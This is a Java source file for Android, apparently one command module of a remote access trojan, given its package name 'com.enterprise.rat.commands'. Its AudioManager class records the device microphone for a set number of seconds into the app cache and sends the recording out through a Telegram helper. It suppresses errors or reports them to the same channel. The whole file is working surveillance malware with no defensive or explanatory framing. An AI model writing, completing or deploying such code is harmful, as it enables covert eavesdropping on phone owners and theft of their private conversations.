package com.enterprise.rat.commands;

import android.content.Context;
import android.media.MediaRecorder;
import android.os.Handler;
import android.os.Looper;
import com.enterprise.rat.utils.TelegramApi;
import java.io.File;

public class AudioManager {
    private Context context;
    private MediaRecorder recorder;

    public AudioManager(Context context) { this.context = context; }

    public void recordAudio(int seconds) {
        try {
            File audioFile = new File(context.getCacheDir(), "rec.mp3");
            recorder = new MediaRecorder();
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            recorder.setOutputFile(audioFile.getAbsolutePath());
            recorder.prepare();
            recorder.start();

            new Handler(Looper.getMainLooper()).postDelayed(() -> {
                try {
                    recorder.stop();
                    recorder.release();
                    TelegramApi.sendFile(audioFile, "🎙 Audio Record (" + seconds + "s)");
                } catch (Exception e) {}
            }, seconds * 1000);
        } catch (Exception e) {
            TelegramApi.sendMessage("❌ Audio Error: " + e.getMessage());
        }
    }
}
